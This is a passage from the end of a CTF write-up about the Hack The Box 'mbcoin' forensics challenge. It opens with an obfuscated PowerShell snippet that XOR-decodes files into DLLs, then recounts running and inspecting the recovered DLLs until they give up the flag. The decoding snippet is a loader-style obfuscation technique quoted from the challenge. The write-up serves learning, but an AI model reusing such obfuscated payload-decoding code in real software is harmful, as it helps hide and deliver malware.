</span></span><span style=display:flex><span>$b = [System.IO.File]::ReadAllBytes(((<span style=color:#0ff;font-weight:700>&#39;www4.d&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;ll&#39;</span>)  -CrePLacE<span style=color:#0ff;font-weight:700>&#39;GPH&#39;</span>,[Char]92)); $k = (<span style=color:#0ff;font-weight:700>&#39;6i&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;I&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;oN&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;o&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;Mk5&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;iRYAw&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;7Z&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;TWed0Cr&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;juZ9wijyQDj&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;Py&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;9Ms0D8K0Z2H5MX6wyOKqFxl&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;Om1&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;G&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;pjmYfaQX&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;acA6&#39;</span>); $r = <span style=color:#fff;font-weight:700>New-Object</span> Byte[] $b.length; <span style=color:#fff;font-weight:700>for</span>($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; <span style=color:#fff;font-weight:700>if</span> ($r.length -gt 0) { [System.IO.File]::WriteAllBytes(((<span style=color:#0ff;font-weight:700>&#39;www&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;.d&#39;</span>+<span style=color:#0ff;font-weight:700>&#39;ll&#39;</span>).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}
</span></span><span style=display:flex><span><span style=color:#007f7f>#$b = [System.IO.File]::ReadAllBytes(((&#39;www5.d&#39;+&#39;ll&#39;)  -CrePLacE&#39;GPH&#39;,[Char]92)); $k = (&#39;6i&#39;+&#39;I&#39;+&#39;IE&#39;+&#39;o&#39;+&#39;Mk5&#39;+&#39;iRYAw&#39;+&#39;7Z&#39;+&#39;TWed0Cr&#39;+&#39;juZ9wijyQDj&#39;+&#39;YL&#39;+&#39;9Ms0D8K0Z2H5MX6wyOKqFxl&#39;+&#39;Om1&#39;+&#39;a&#39;+&#39;pjmYfaQX&#39;+&#39;acA6&#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) {[System.IO.File]::WriteAllBytes(((&#39;www&#39;+&#39;.d&#39;+&#39;ll&#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}</span>
</span></span></code></pre></div><p>Once this is executed, we recover the two functional dlls. Or are they? Trying to run them with <code>rundll32.exe www.dll,ldr</code> gives me an error.<br><img src=rundll.png alt=rundll.png></p><p>Oh well, anyway, we&rsquo;re probably not meant to run them for real? I got another of my team member to run them, but they both just gave a messagebox asking if we were sure it was the one being ran on the system.</p><p>At that point, I figured that if it wasn&rsquo;t www1 nor www4 that we needed, I really had to find a way to get the last dll (www5) out of bonus.corporatebusinessmachines.htb. Unless something was missing from the challenge, the pcap really didn&rsquo;t have anything related to it.<br><img src=noname.png alt=noname.png></p><p>It took me a while to give up on finding www5.dll, but at some point, there is nothing much we can do with a simple failed dns query&mldr; I finally decided to go to sleep, which was a great idea.</p><p>Coming back to it in the morning, I took another look at the two dlls that I had, I started to check what kind of information there was. Using external tools, I could see timestamps, compiler information, sections, and codeview information : <code>Z:\hackthebox-submissions\202207-business-ctf-mbcoin\mbcoin\mbcoin\x64\Release\mbcoin.pdb</code>.</p><p>The information looks pretty much the same for both. A bit desperate because reversing isn&rsquo;t my strong suit, I tried to look at the first one (pt/www1) with hexdump -C. I know, I know, that&rsquo;s not reversing, and what hopes could I have to get anything out of it? At least I could then see the messagebox related information that one of my team member was able to get when running the dll.<br><img src=Oops.png alt=Oops.png></p><p>I did the same thing with the other dll (vm/www4), and.. I think my team member did a mistake when running both dlls, since in his case, they both gave the Oops message, but that second one is definitely different. Trying to finalize a challenge at 2AM may not be the best idea&mldr;<br><img src=Congrats.png alt=Congrats.png></p><p>After telling my team member, he tried again, and voilà&mldr;. :D<br><img src=congrats2.png alt=congrats2.png></p><div class=chevrons><div id=navigation></div></div></section></article><footer><div class=footline></div><div><p>Weeeeeeeeeeeeeeee</p></div></footer><script src=/writeups/js/jquery-2.x.min.js></script>
<script type=text/javascript>var baseurl="https://n1trate.github.io/writeups"</script><script src=/writeups/js/clipboard.min.js></script>
<script src=/writeups/js/featherlight.min.js></script>
<script type=text/javascript src=/writeups/js/lunr.min.js></script>
<script type=text/javascript src=/writeups/js/auto-complete.js></script>
<script type=text/javascript src=/writeups/js/search.js></script>
<script src=/writeups/theme-flex/script.js></script>
<script src=https://n1trate.github.io/writeups/js/scripts.min.js></script></body></html>